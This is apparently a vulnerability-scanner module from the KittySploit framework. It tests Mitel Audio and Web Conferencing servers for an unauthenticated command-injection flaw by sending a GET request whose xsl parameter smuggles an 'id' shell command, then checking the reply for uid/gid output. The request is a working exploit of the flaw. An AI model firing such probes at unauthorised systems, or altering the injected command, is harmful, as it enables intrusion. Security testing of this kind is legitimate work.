#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects Mitel Audio and Web Conferencing RCE via /awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mitel AWC - xsl Parameter RCE Detection',
        'description': (
            'Detects Mitel Audio and Web Conferencing RCE via /awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26id%26 matching uid=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'mitel', 'awc', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/45537',
        ],
    }

    def run(self):
        path = '/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26id%26'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(severity='critical', reason='Mitel AWC xsl parameter RCE', path='/awcuser/cgi-bin/vcs')
            return True
        return False

